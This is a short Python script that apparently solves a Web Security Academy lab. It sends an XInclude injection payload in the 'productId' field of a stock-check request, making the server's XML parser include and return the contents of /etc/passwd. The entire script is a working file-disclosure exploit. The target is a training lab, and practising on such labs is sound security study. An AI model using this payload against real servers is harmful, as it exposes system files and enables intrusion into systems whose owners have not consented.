import requests

s = requests.Session()

site = 'ac9f1f021ee53d9fc0cb3f9a005400b0.web-security-academy.net'
stock_url = f'https://{site}/product/stock'

xml_post_data = { 
    'productId' : '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    'storeId' : '1'
}

resp = s.post(stock_url, data=xml_post_data)
print(resp.text)